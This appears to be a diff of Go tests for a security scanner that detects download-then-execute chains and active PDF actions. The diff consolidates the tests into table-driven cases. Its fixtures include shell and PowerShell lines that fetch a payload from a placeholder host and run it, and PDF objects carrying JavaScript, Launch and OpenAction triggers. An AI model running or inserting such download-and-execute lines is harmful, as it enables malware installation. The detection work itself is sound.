@@ -63,25 +63,16 @@ func TestPowerShellEncodedCommandAliases(t *testing.T) {
 	}
 }
 
-func TestDownloadAndChmodWithoutLaunchIsNotStagedExecution(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "download.sh", "curl https://example.invalid/tool -o /tmp/tool\nchmod +x /tmp/tool\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if hasRule(findings, "CHAIN-004") {
-		t.Fatalf("download plus chmod was treated as execution: %+v", findings)
-	}
-}
-
-func TestCommentedDownloadsAreNotStagedExecution(t *testing.T) {
+func TestPassiveDownloadTextIsNotStagedExecution(t *testing.T) {
 	for _, tc := range []struct {
 		name, path, body string
 	}{
+		{"download without launch", "download.sh", "curl https://example.invalid/tool -o /tmp/tool\nchmod +x /tmp/tool\n"},
 		{"shell comment", "download.sh", "# curl -o payload https://example.invalid/tool\n./payload\n"},
 		{"PowerShell comment", "download.ps1", "# Invoke-WebRequest https://example.invalid/tool -OutFile payload\n& payload\n"},
 		{"PowerShell block comment", "download.ps1", "<#\nInvoke-WebRequest https://example.invalid/tool -OutFile payload\n#>\n& payload\n"},
 		{"batch comment", "download.cmd", "REM certutil is not run here\r\nREM curl -o payload https://example.invalid/tool\r\npayload\r\n"},
+		{"quoted downloader", "example.sh", "printf 'curl -o payload https://example.invalid/tool'\n./payload\n"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			root := t.TempDir()
@@ -90,20 +81,9 @@ func TestCommentedDownloadsAreNotStagedExecution(t *testing.T) {
 			writeFixture(t, root, tc.path, tc.body)
 			_, findings := New(Options{}).Scan(context.Background(), root)
 			if hasRule(findings, "CHAIN-004") {
-				t.Fatalf("commented download was treated as execution: %+v", findings)
+				t.Fatalf("passive download text was treated as execution: %+v", findings)
 			}
 		})
-	}
-}
-
-func TestQuotedDownloaderTextIsNotStagedExecution(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "example.sh", "printf 'curl -o payload https://example.invalid/tool'\n./payload\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if hasRule(findings, "CHAIN-004") {
-		t.Fatalf("quoted downloader example was treated as execution: %+v", findings)
 	}
 }
 
@@ -147,50 +127,14 @@ func TestExtensionlessStagedExecutionIsDetected(t *testing.T) {
 	}
 }
 
-func TestArchivedExecutableExtensionlessStagedExecutionIsDetected(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	var buffer bytes.Buffer
-	writer := zip.NewWriter(&buffer)
-	header := &zip.FileHeader{Name: "install", Method: zip.Deflate}
-	header.SetMode(0o755)
-	entry, err := writer.CreateHeader(header)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if _, err := entry.Write([]byte("curl -o payload https://example.invalid/tool\n./payload\n")); err != nil {
-		t.Fatal(err)
-	}
-	if err := writer.Close(); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(filepath.Join(root, "bundle.zip"), buffer.Bytes(), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "CHAIN-004") {
-		t.Fatalf("archived executable extensionless script was missed: %+v", findings)
-	}
-}
-
-func TestQuotedStagedExecutionPathIsCorrelated(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "download.sh", "curl -o \"payload file\" https://example.invalid/tool\nbash \"./payload file\"\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "CHAIN-004") {
-		t.Fatalf("quoted staged-execution path was missed: %+v", findings)
-	}
-}
-
-func TestDefaultDownloadDestinationsAreCorrelated(t *testing.T) {
+func TestDownloadedPathsAreCorrelatedWithExecution(t *testing.T) {
 	for _, tc := range []struct {
 		name, command string
 	}{
 		{"curl remote name", "curl -O https://example.invalid/payload\n./payload\n"},
 		{"wget default name", "wget https://example.invalid/payload\n./payload\n"},
+		{"quoted output path", "curl -o \"payload file\" https://example.invalid/tool\nbash \"./payload file\"\n"},
+		{"wget spaced output flag", "wget -O /tmp/payload https://example.invalid/tool\n/tmp/payload\n"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			root := t.TempDir()
@@ -199,20 +143,9 @@ func TestDefaultDownloadDestinationsAreCorrelated(t *testing.T) {
 			writeFixture(t, root, "download.sh", tc.command)
 			_, findings := New(Options{}).Scan(context.Background(), root)
 			if !hasRule(findings, "CHAIN-004") {
-				t.Fatalf("default download destination was missed: %+v", findings)
+				t.Fatalf("downloaded path was not correlated with execution: %+v", findings)
 			}
 		})
-	}
-}
-
-func TestWgetSpacedOutputDestinationIsCorrelated(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "download.sh", "wget -O /tmp/payload https://example.invalid/tool\n/tmp/payload\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "CHAIN-004") {
-		t.Fatalf("wget -O destination was missed: %+v", findings)
 	}
 }
 
@@ -313,108 +246,30 @@ func TestUnrelatedOfficeFieldsAreNotConcatenated(t *testing.T) {
 	}
 }
 
-func TestNestedArchiveFindingKeepsOuterFixtureContext(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	if err := os.MkdirAll(filepath.Join(root, "testdata"), 0o755); err != nil {
-		t.Fatal(err)
-	}
-	writeZIPFixture(t, filepath.Join(root, "testdata"), "sample.docm", map[string]string{
-		"word/vbaProject.bin": "fixture macro bytes",
-	})
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	finding, ok := ruleFinding(findings, "DOC-002")
-	if !ok || finding.Context != "test-fixture" || finding.Severity != model.SeverityMedium || finding.Confidence != model.ConfidenceLow || finding.Disposition != model.DispositionInformational {
-		t.Fatalf("outer archive fixture context was lost: %+v", findings)
-	}
-}
-
-func TestPDFNamesInCommentsStringsAndStreamsArePassive(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "brief.pdf", "%PDF-1.7\n% /S /JavaScript /JS\n1 0 obj << /Length 34 >> stream\n/S /Launch /Type /EmbeddedFile\nendstream\nendobj\n2 0 obj (Documentation for /JavaScript) endobj\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if hasRule(findings, "DOC-001") {
-		t.Fatalf("passive PDF bytes were treated as active content: %+v", findings)
-	}
-}
-
-func TestPDFCarriageReturnStreamPayloadIsPassive(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "brief.pdf", "%PDF-1.7\r1 0 obj << /Length 26 >> stream\r/S /Launch /Type /EmbeddedFile\rendstream\rendobj\r")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if hasRule(findings, "DOC-001") {
-		t.Fatalf("CR-delimited PDF stream payload was treated as active content: %+v", findings)
-	}
-}
-
-func TestEscapedPDFActionNamesAreDetected(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "active.pdf", "%PDF-1.7\n1 0 obj << /J#53 (fixture) /S /Java#53cript >> endobj\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "DOC-001") {
-		t.Fatalf("escaped PDF action names were missed: %+v", findings)
-	}
-}
-
-func TestPDFAdditionalActionIsDetected(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "active.pdf", "%PDF-1.7\n1 0 obj << /AA << /O << /S /SubmitForm /F (https://example.invalid) >> >> >> endobj\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "DOC-001") {
-		t.Fatalf("PDF additional action was missed: %+v", findings)
-	}
-}
-
-func TestPDFIndirectActionIsDetectedRegardlessOfObjectOrder(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "active.pdf", "%PDF-1.7\n2 0 obj << /S /URI /URI (https://example.invalid) >> endobj\n1 0 obj << /OpenAction 2 0 R >> endobj\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "DOC-001") {
-		t.Fatalf("indirect PDF action before its trigger was missed: %+v", findings)
-	}
-}
-
-func TestPDFStreamParenthesisDoesNotHideLaterAction(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "active.pdf", "%PDF-1.7\n1 0 obj << /Length 1 >> stream\n(\nendstream\nendobj\n2 0 obj << /JS (fixture) /S /JavaScript >> endobj\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "DOC-001") {
-		t.Fatalf("stream parenthesis hid a later PDF action: %+v", findings)
-	}
-}
-
-func TestPDFCommentContainingStreamDoesNotHideAction(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "active.pdf", "%PDF-1.7\n% stream\n1 0 obj << /JS (fixture) /S /JavaScript >> endobj\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "DOC-001") {
-		t.Fatalf("stream text in a comment hid a PDF action: %+v", findings)
-	}
-}
-
-func TestPDFStreamNameDoesNotHideAction(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-	writeFixture(t, root, "active.pdf", "%PDF-1.7\n1 0 obj << /stream\n0 /OpenAction 2 0 R >> endobj\n2 0 obj << /JS (fixture) /S /JavaScript >> endobj\n")
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	if !hasRule(findings, "DOC-001") {
-		t.Fatalf("PDF /stream name hid a later action: %+v", findings)
+func TestPDFActionDetectionIgnoresPassiveSyntaxAndFindsActiveObjects(t *testing.T) {
+	for _, tc := range []struct {
+		name, body string
+		wantAction bool
+	}{
+		{"comments strings and streams", "%PDF-1.7\n% /S /JavaScript /JS\n1 0 obj << /Length 34 >> stream\n/S /Launch /Type /EmbeddedFile\nendstream\nendobj\n2 0 obj (Documentation for /JavaScript) endobj\n", false},
+		{"CR-delimited stream", "%PDF-1.7\r1 0 obj << /Length 26 >> stream\r/S /Launch /Type /EmbeddedFile\rendstream\rendobj\r", false},
+		{"escaped action names", "%PDF-1.7\n1 0 obj << /J#53 (fixture) /S /Java#53cript >> endobj\n", true},
+		{"additional action", "%PDF-1.7\n1 0 obj << /AA << /O << /S /SubmitForm /F (https://example.invalid) >> >> >> endobj\n", true},
+		{"indirect action before trigger", "%PDF-1.7\n2 0 obj << /S /URI /URI (https://example.invalid) >> endobj\n1 0 obj << /OpenAction 2 0 R >> endobj\n", true},
+		{"stream parenthesis before action", "%PDF-1.7\n1 0 obj << /Length 1 >> stream\n(\nendstream\nendobj\n2 0 obj << /JS (fixture) /S /JavaScript >> endobj\n", true},
+		{"comment containing stream", "%PDF-1.7\n% stream\n1 0 obj << /JS (fixture) /S /JavaScript >> endobj\n", true},
+		{"stream name before action", "%PDF-1.7\n1 0 obj << /stream\n0 /OpenAction 2 0 R >> endobj\n2 0 obj << /JS (fixture) /S /JavaScript >> endobj\n", true},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			root := t.TempDir()
+			writeFixture(t, root, "README.md", "fixture\n")
+			writeFixture(t, root, "LICENSE", "fixture\n")
+			writeFixture(t, root, "document.pdf", tc.body)
+			_, findings := New(Options{}).Scan(context.Background(), root)
+			if got := hasRule(findings, "DOC-001"); got != tc.wantAction {
+				t.Fatalf("PDF action detected = %v, want %v: %+v", got, tc.wantAction, findings)
+			}
+		})
 	}
 }
 
@@ -427,55 +282,6 @@ func TestActiveDocumentFixtureIsContextual(t *testing.T) {
 	finding, ok := ruleFinding(findings, "DOC-001")
 	if !ok || finding.Severity != model.SeverityMedium || finding.Confidence != model.ConfidenceLow || finding.Disposition != model.DispositionInformational {
 		t.Fatalf("active document fixture was not contextualized: %+v", findings)
-	}
-}
-
-func TestNestedDocumentAndVSIXActiveContent(t *testing.T) {
-	root := t.TempDir()
-	writeFixture(t, root, "README.md", "fixture\n")
-	writeFixture(t, root, "LICENSE", "fixture\n")
-
-	makeArchive := func(name, body string) []byte {
-		var buffer bytes.Buffer
-		writer := zip.NewWriter(&buffer)
-		entry, err := writer.Create(name)
-		if err != nil {
-			t.Fatal(err)
-		}
-		if _, err := entry.Write([]byte(body)); err != nil {
-			t.Fatal(err)
-		}
-		if err := writer.Close(); err != nil {
-			t.Fatal(err)
-		}
-		return buffer.Bytes()
-	}
-	office := makeArchive("word/vbaProject.bin", "fixture macro bytes")
-	vsix := makeArchive("extension/package.json", `{"activationEvents":["onStartupFinished"]}`)
-
-	var outer bytes.Buffer
-	outerWriter := zip.NewWriter(&outer)
-	for name, body := range map[string][]byte{"brief.docm": office, "extension.vsix": vsix} {
-		entry, err := outerWriter.Create(name)
-		if err != nil {
-			t.Fatal(err)
-		}
-		if _, err := entry.Write(body); err != nil {
-			t.Fatal(err)
-		}
-	}
-	if err := outerWriter.Close(); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(filepath.Join(root, "bundle.zip"), outer.Bytes(), 0o644); err != nil {
-		t.Fatal(err)
-	}
-
-	_, findings := New(Options{}).Scan(context.Background(), root)
-	for _, id := range []string{"DOC-002", "IDE-008"} {
-		if !hasRule(findings, id) {
-			t.Errorf("missing nested %s: %+v", id, findings)
-		}
 	}
 }
 
